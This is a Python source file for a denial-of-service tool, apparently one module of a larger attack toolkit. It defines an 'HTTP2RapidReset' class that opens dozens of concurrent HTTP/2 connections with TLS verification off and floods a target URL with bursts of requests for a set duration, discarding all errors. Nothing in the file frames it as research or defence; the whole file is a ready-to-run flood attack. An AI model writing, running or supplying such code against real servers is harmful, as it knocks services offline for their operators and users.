import asyncio
import httpx
import random
from utils.logger import logger

class HTTP2RapidReset:
    def __init__(self):
        self.running = False

    async def attack(self, target_url, connections=50, streams_per_conn=100, duration=30):
        self.running = True
        logger.info(f"HTTP/2 Rapid Reset on {target_url} ({connections} connections)")
        end_time = asyncio.get_event_loop().time() + duration

        async def attacker():
            async with httpx.AsyncClient(http2=True, verify=False) as client:
                while self.running and (asyncio.get_event_loop().time() < end_time):
                    try:
                        tasks = [client.get(target_url) for _ in range(streams_per_conn)]
                        responses = await asyncio.gather(*tasks, return_exceptions=True)
                        for resp in responses:
                            if hasattr(resp, 'aclose'):
                                await resp.aclose()
                    except Exception:
                        pass
                    await asyncio.sleep(0.01)

        tasks = [attacker() for _ in range(connections)]
        await asyncio.gather(*tasks)
        logger.info("HTTP/2 attack finished")

    def start(self, target, connections=50, duration=30):
        asyncio.run(self.attack(target, connections=connections, duration=duration))